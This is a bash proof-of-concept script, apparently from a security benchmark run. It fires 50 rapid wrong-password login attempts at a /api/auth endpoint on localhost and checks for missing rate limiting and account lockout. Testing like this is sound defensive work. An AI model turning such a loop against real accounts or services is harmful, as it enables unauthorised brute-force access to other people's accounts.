#!/bin/bash
# POC: Demonstrates missing brute force protection on /api/auth endpoint by sending multiple rapid authentication attempts without receiving rate limiting (429) or account lockout responses
# Target: ./repo
# Created: 2025-11-07T21:44:18.907Z
# Session: benchmark-XBEN-084-24-mhpdbk6l

# Brute Force Protection Vulnerability POC
# Tests for missing rate limiting and account lockout mechanisms on /api/auth endpoint

TARGET_URL="${1:-http://localhost:3000/api/auth}"
TARGET_EMAIL="${2:-admin@test.com}"
NUM_ATTEMPTS="${3:-50}"

echo "[*] Testing Brute Force Protection on Authentication Endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Email: $TARGET_EMAIL"
echo "[*] Attempts: $NUM_ATTEMPTS"
echo ""

# Track results
success_count=0
rate_limit_count=0
error_count=0
response_times=()
http_codes=()

echo "[*] Starting rapid authentication attempts..."
start_time=$(date +%s%N)

for i in $(seq 1 $NUM_ATTEMPTS); do
  # Generate different passwords for each attempt
  password="wrong_password_${i}"
  
  # Send request and capture response code and time
  response=$(curl -s -w "\n%{http_code}\n%{time_total}" -X POST "$TARGET_URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$TARGET_EMAIL\",\"password\":\"$password\"}")
  
  # Parse response
  http_code=$(echo "$response" | tail -1)
  response_time=$(echo "$response" | tail -2 | head -1)
  body=$(echo "$response" | head -n -2)
  
  http_codes+=($http_code)
  response_times+=($response_time)
  
  # Track response codes
  if [ "$http_code" = "429" ]; then
    ((rate_limit_count++))
  elif [ "$http_code" = "401" ] || [ "$http_code" = "403" ]; then
    ((success_count++))
  else
    ((error_count++))
  fi
  
  # Show progress every 10 attempts
  if [ $((i % 10)) -eq 0 ]; then
    echo "  [$i/$NUM_ATTEMPTS] HTTP $http_code - ${response_time}s"
  fi
done

end_time=$(date +%s%N)
total_time=$(echo "scale=3; ($end_time - $start_time) / 1000000" | bc)

echo ""
echo "[*] Test Results:"
echo "=========================================="
echo "Total Attempts: $NUM_ATTEMPTS"
echo "Total Time: ${total_time}ms"
echo "Avg Time per Request: $(echo "scale=2; $total_time / $NUM_ATTEMPTS" | bc)ms"
echo ""
echo "HTTP 401/403 (Auth Failures): $success_count"
echo "HTTP 429 (Rate Limited): $rate_limit_count"
echo "Other Errors: $error_count"
echo ""

# Vulnerability Assessment
if [ $rate_limit_count -eq 0 ]; then
  echo "[!] VULNERABILITY CONFIRMED:"
  echo "    - No rate limiting responses (HTTP 429) received"
  echo "    - All $NUM_ATTEMPTS authentication attempts processed without protection"
  echo "    - Brute force attack is possible"
  exit 0
else
  echo "[+] Rate limiting is active"
  echo "    - Received $rate_limit_count rate limit responses"
  exit 1
fi